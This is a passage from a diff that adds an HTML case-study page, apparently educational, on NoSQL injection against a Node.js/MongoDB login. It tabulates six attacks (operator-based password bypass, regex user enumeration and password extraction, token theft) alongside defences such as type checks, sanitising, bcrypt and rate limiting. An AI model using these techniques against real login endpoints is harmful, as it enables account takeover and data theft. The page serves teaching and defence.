+        <p>All failed login attempts are logged with timestamp, IP, and payload shape. Non-string fields immediately flag injection attempts in real time for response teams.</p>
+        <div class="code-block">
+          <div class="code-header"><div class="dots"><span class="r"/><span class="y"/><span class="g"/></div><span class="lang">server.js</span></div>
+          <code><span class="c-fn">if</span> (<span class="c-fn">typeof</span> username !== <span class="c-str">'string'</span>) {
+  console.<span class="c-fn">warn</span>(<span class="c-str">'[ALERT]'</span>, {
+    ip: req.ip,
+    time: <span class="c-fn">new</span> Date(),
+    payloadShape
+  });
+}</code>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════ RESULTS ════════════════════════════════ -->
+<section id="results">
+<div class="container">
+  <div class="section-tag neutral fade-up">05 — VERIFICATION</div>
+  <h2 class="fade-up stagger-1">Before vs After —<br>All 6 Attacks</h2>
+  <p class="lead fade-up stagger-2">Post-mitigation testing confirms that injection payloads no longer produce valid tokens, enumeration is disrupted, and unauthorized note access fails at session validation.</p>
+
+  <div style="overflow-x:auto;margin-top:2rem" class="fade-up stagger-3">
+    <table class="comparison-table">
+      <thead>
+        <tr>
+          <th>Attack</th>
+          <th>Technique</th>
+          <th>Operator</th>
+          <th>Before Defences</th>
+          <th>After Defences</th>
+          <th>HTTP</th>
+          <th>Defences</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="col-attack">1 — Password Bypass</td>
+          <td class="col-tech">Direct injection</td>
+          <td><span class="col-op">$ne</span></td>
+          <td class="col-before">✗ Login success</td>
+          <td class="col-after">✓ Blocked</td>
+          <td><span class="http-badge http-400">400</span></td>
+          <td style="font-family:var(--mono);font-size:0.75rem;color:#88aaff">D1 · D2</td>
+        </tr>
+        <tr>
+          <td class="col-attack">2 — Blind Login</td>
+          <td class="col-tech">Direct injection</td>
+          <td><span class="col-op">$gt</span></td>
+          <td class="col-before">✗ Login success</td>
+          <td class="col-after">✓ Blocked</td>
+          <td><span class="http-badge http-400">400</span></td>
+          <td style="font-family:var(--mono);font-size:0.75rem;color:#88aaff">D1 · D2</td>
+        </tr>
+        <tr>
+          <td class="col-attack">3 — User Enumeration</td>
+          <td class="col-tech">Regex scan</td>
+          <td><span class="col-op">$regex</span></td>
+          <td class="col-before">✗ Users enumerated</td>
+          <td class="col-after">✓ Rate limited</td>
+          <td><span class="http-badge http-429">429</span></td>
+          <td style="font-family:var(--mono);font-size:0.75rem;color:#88aaff">D4 · D5</td>
+        </tr>
+        <tr>
+          <td class="col-attack">4 — Password Extraction</td>
+          <td class="col-tech">Char-by-char</td>
+          <td><span class="col-op">$regex</span></td>
+          <td class="col-before">✗ Password exposed</td>
+          <td class="col-after">✓ bcrypt defeats regex</td>
+          <td><span class="http-badge http-401">401</span></td>
+          <td style="font-family:var(--mono);font-size:0.75rem;color:#88aaff">D3 · D4</td>
+        </tr>
+        <tr>
+          <td class="col-attack">5 — Targeted Takeover</td>
+          <td class="col-tech">Targeted injection</td>
+          <td><span class="col-op">$ne</span></td>
+          <td class="col-before">✗ Login success</td>
+          <td class="col-after">✓ Blocked</td>
+          <td><span class="http-badge http-400">400</span></td>
+          <td style="font-family:var(--mono);font-size:0.75rem;color:#88aaff">D1 · D2</td>
+        </tr>
+        <tr>
+          <td class="col-attack">6 — Note Theft</td>
+          <td class="col-tech">Stolen token</td>
+          <td><span class="col-op">—</span></td>
+          <td class="col-before">✗ Notes accessed</td>
+          <td class="col-after">✓ Token never issued</td>
+          <td><span class="http-badge http-401">401</span></td>
+          <td style="font-family:var(--mono);font-size:0.75rem;color:#88aaff">All</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Operator reference -->
+  <div style="margin-top:3rem" class="fade-up stagger-4">
+    <div style="font-family:var(--mono);font-size:0.7rem;color:var(--muted);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:1rem">MongoDB Operators Exploited</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1rem">
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:6px;padding:1rem">
+        <div style="font-family:var(--mono);font-size:1rem;color:#c9a9ff;margin-bottom:0.4rem">$ne</div>
+        <div style="font-size:0.83rem;color:var(--muted)">Not equal — matches any value that isn't the specified string</div>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:6px;padding:1rem">
+        <div style="font-family:var(--mono);font-size:1rem;color:#c9a9ff;margin-bottom:0.4rem">$gt</div>
+        <div style="font-size:0.83rem;color:var(--muted)">Greater than — matches any non-empty string, i.e. all real credentials</div>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:6px;padding:1rem">
+        <div style="font-family:var(--mono);font-size:1rem;color:#c9a9ff;margin-bottom:0.4rem">$regex</div>
+        <div style="font-size:0.83rem;color:var(--muted)">Pattern match — enables user enumeration and character-by-character extraction</div>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:6px;padding:1rem">
+        <div style="font-family:var(--mono);font-size:1rem;color:#c9a9ff;margin-bottom:0.4rem">$in</div>
+        <div style="font-size:0.83rem;color:var(--muted)">In array — matches against a list of known values simultaneously</div>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:6px;padding:1rem">
+        <div style="font-family:var(--mono);font-size:1rem;color:#c9a9ff;margin-bottom:0.4rem">$exists</div>
+        <div style="font-size:0.83rem;color:var(--muted)">Field existence check — confirms whether a field is present in the document</div>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:6px;padding:1rem">
+        <div style="font-family:var(--mono);font-size:1rem;color:#c9a9ff;margin-bottom:0.4rem">$where</div>
+        <div style="font-size:0.83rem;color:var(--muted)">JavaScript execution — allows arbitrary code to run in the MongoDB query context</div>
+      </div>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════ CONCLUSION ═════════════════════════════ -->
+<section id="conclusion">
+<div class="container">
+  <div class="section-tag neutral fade-up">06 — SUMMARY</div>
+  <h2 class="fade-up stagger-1">Key Takeaways</h2>
+
+  <div class="conclusion-grid">
+    <div class="conclusion-col red fade-up stagger-1">
+      <h3>Red Team Findings</h3>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#e53535" stroke-width="1.5"/><line x1="9" y1="5" x2="9" y2="10" stroke="#e53535" stroke-width="2" stroke-linecap="round"/><circle cx="9" cy="13" r="1" fill="#e53535"/></svg>
+        </div>
+        <p>6 distinct attack vectors on a single endpoint — none requiring prior knowledge of credentials</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#e53535" stroke-width="1.5"/><line x1="9" y1="5" x2="9" y2="10" stroke="#e53535" stroke-width="2" stroke-linecap="round"/><circle cx="9" cy="13" r="1" fill="#e53535"/></svg>
+        </div>
+        <p>Authentication fully bypassed with a single JSON object — no brute force, no dictionary attack</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#e53535" stroke-width="1.5"/><line x1="9" y1="5" x2="9" y2="10" stroke="#e53535" stroke-width="2" stroke-linecap="round"/><circle cx="9" cy="13" r="1" fill="#e53535"/></svg>
+        </div>
+        <p>Plaintext passwords extractable character-by-character using ~270 automated requests</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#e53535" stroke-width="1.5"/><line x1="9" y1="5" x2="9" y2="10" stroke="#e53535" stroke-width="2" stroke-linecap="round"/><circle cx="9" cy="13" r="1" fill="#e53535"/></svg>
+        </div>
+        <p>Stolen session tokens grant full downstream data access — all private notes exfiltrated</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#e53535" stroke-width="1.5"/><line x1="9" y1="5" x2="9" y2="10" stroke="#e53535" stroke-width="2" stroke-linecap="round"/><circle cx="9" cy="13" r="1" fill="#e53535"/></svg>
+        </div>
+        <p>All attack routes discoverable via browser DevTools — no source code access required</p>
+      </div>
+    </div>
+
+    <div class="conclusion-col blue fade-up stagger-2">
+      <h3>Blue Team Defences</h3>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a7fe0" stroke-width="1.5"/><path d="M5 9 L8 12 L13 6" stroke="#4baeff" stroke-width="2" stroke-linecap="round"/></svg>
+        </div>
+        <p>D1: Strict type checking — operator objects rejected before reaching the database layer</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a7fe0" stroke-width="1.5"/><path d="M5 9 L8 12 L13 6" stroke="#4baeff" stroke-width="2" stroke-linecap="round"/></svg>
+        </div>
+        <p>D2: Global mongo-sanitize middleware strips all $ keys from every request body and query string</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a7fe0" stroke-width="1.5"/><path d="M5 9 L8 12 L13 6" stroke="#4baeff" stroke-width="2" stroke-linecap="round"/></svg>
+        </div>
+        <p>D3: bcrypt hashing makes the regex extraction attack physically impossible — hashes can't match prefix patterns</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a7fe0" stroke-width="1.5"/><path d="M5 9 L8 12 L13 6" stroke="#4baeff" stroke-width="2" stroke-linecap="round"/></svg>
+        </div>
+        <p>D4: Rate limiting raises the cost of enumeration from seconds to days — brute-force is economically unviable</p>
+      </div>
+      <div class="takeaway-item">
+        <div class="takeaway-icon">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a7fe0" stroke-width="1.5"/><path d="M5 9 L8 12 L13 6" stroke="#4baeff" stroke-width="2" stroke-linecap="round"/></svg>
+        </div>
+        <p>D5+D6: Generic errors remove feedback loops; security logging enables real-time detection and IP blocking</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="conclusion-footer fade-up stagger-3">
+    <strong>No single defence is sufficient on its own.</strong><br>
+    The layered approach ensures that even if one control fails or is misconfigured,<br>
+    the remaining controls prevent compromise — this is the core principle of <strong>defence-in-depth</strong>.
+  </div>
+</div>
+</section>
+
+<footer>
+  <span style="color:var(--red)">●</span> NoSQL Injection Case Study &nbsp;·&nbsp;
+  Red Team / Blue Team &nbsp;·&nbsp;
+  Node.js · MongoDB · Express &nbsp;·&nbsp;
+  <span style="color:var(--blue)">●</span>
+  &nbsp;&nbsp;⚠ FOR EDUCATIONAL USE ONLY
+</footer>
+
+<!-- ═══════════════════════════════ SCRIPTS ════════════════════════════════ -->
+<script>
+// Intersection Observer for fade-up animations
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      e.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0.1, rootMargin: '0px 0px -60px 0px' });
+
+document.querySelectorAll('.fade-up').forEach(el => observer.observe(el));
+
+// Active nav link
+const sections = document.querySelectorAll('section[id]');
+const navLinks = document.querySelectorAll('.nav-links a');
+
+const navObserver = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => a.classList.remove('active'));
+      const link = document.querySelector(`.nav-links a[href="#${e.target.id}"]`);
+      if (link) link.classList.add('active');
+    }
+  });
+}, { threshold: 0.4 });
+
+sections.forEach(s => navObserver.observe(s));
+</script>
+</body>
+</html>
